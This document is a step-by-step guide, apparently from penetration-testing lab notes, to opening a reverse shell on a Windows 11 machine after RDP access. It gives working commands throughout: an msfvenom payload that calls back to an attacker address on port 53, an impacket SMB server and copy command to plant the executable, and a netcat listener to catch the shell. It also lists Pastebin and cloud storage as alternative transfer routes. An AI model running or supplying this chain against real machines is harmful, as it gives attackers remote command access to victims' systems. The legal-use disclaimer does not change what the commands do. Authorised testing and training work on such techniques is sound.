# Obtaining a Shell via RDP on Windows 11

## Overview
This guide demonstrates how to establish a reverse shell connection after gaining RDP access to a Windows 11 machine using Kali Linux tools.

## Prerequisites
- RDP access to Windows 11 target machine
- Kali Linux attacker machine
- Network connectivity between both systems

## Step 1: Generate Reverse Shell Payload

On Kali Linux, generate a Windows reverse shell executable using msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
```

**Note:** Replace `10.10.10.10` with your Kali Linux IP address.

## Step 2: Transfer Payload to Windows Target

### Option A: SMB Server Method

1. **Start SMB server on Kali:**
   ```bash
   sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
   ```

2. **Copy file from Windows:**
   ```cmd
   copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
   ```

### Option B: Alternative Transfer Methods
- HTTP server: `python3 -m http.server 80`
- FTP transfer
- Cloud storage services
- Pastebin with base64 encoding

## Step 3: Execute Reverse Shell

1. **Start netcat listener on Kali:**
   ```bash
   sudo nc -nvlp 53
   ```

2. **Execute payload on Windows:**
   ```cmd
   C:\PrivEsc\reverse.exe
   ```

## Step 4: Catch the Shell

- The netcat listener should receive the reverse shell connection
- You now have command-line access to the Windows system

## Important Notes

- **Firewall Considerations:** Ensure port 53 (or your chosen port) is not blocked
- **AV Evasion:** The generated executable may be detected by antivirus software
- **Persistence:** This provides a temporary shell (non-persistent)
- **Legal Use:** Only use these techniques on systems you own or have explicit permission to test

## Maintenance

- Keep the `reverse.exe` file for future privilege escalation exercises
- The same payload can be reused for multiple privilege escalation techniques

## Troubleshooting

- Verify IP addresses and port numbers match
- Check firewall rules on both systems
- Ensure the SMB server is running during file transfer
- Confirm the payload is executed with appropriate privileges

---

*This technique is commonly used in penetration testing and red team engagements to maintain access after initial compromise.*